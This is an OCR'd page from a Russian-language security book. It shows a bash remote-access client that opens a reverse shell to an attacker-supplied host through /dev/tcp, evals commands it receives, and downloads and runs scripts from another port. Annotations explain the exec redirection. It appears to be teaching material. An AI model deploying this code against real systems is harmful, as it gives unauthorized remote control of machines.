---
source_image: page_240.png
page_number: 240
model: model-run-olm-ocr
prompt_type: olmocr_technical
processing_time: 7.80
tokens: 7383
characters: 1471
timestamp: 2025-12-23T23:10:52.265623
finish_reason: stop
---

function runScript ()
{
    # передаем, какой сценарий нам нужен
    echo "$1" > /dev/tcp/${HOMEHOST}/${HOMEPORT2}    ⑦
    # останов
    sleep 1
    if [[ $1 == 'exit' ]]; then exit ; fi
    cat > $TMPFL </dev/tcp/${HOMEHOST}/${HOMEPORT3}    ⑨
    bash $TMPFL    ⑩
}

# ---------------------- MAIN ----------------------
# здесь может быть выполнена проверка некоторых ошибок
HOMEHOST=$1
HOMEPORT=$2
HOMEPORT2=${3:-$((HOMEPORT+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}

TMPFL="/tmp/$$.sh"
trap cleanup EXIT

# звонок домой:
exec </dev/tcp/${HOMEHOST}/${HOMEPORT} 1>&0 2>&0    ①

while true
do
    echo -n '$ '
    read -r
    if [[ ${REPLY:0:1} == '!' ]]
    then
        # это сценарий
        FN=${REPLY:1}
        runScript $FN    ⑤
    else
        # обычный случай — запустить cmd
        eval "$REPLY"    ⑥
    fi
done

① Это перенаправление мы встречали раньше, при подключении к TCP-сокету stdin, stdout и stderr. Обратное подключение к LocalRat.sh осуществляет команда сценария nc, ожидающая это соединение. Что здесь может показаться странным, так это встроенная команда exec. Она обычно используется для запуска вместо оболочки другой программы. Если команда не предоставляется (как в данном случае), просто устанавливаются все перенаправления и выполнение продолжается с новыми соединениями ввода-вывода. С этого момента всякий раз, когда сценарий записывает в stdout или stderr, запись будет производиться в TCP-сокет; чтение из stdin будет поступать из сокета.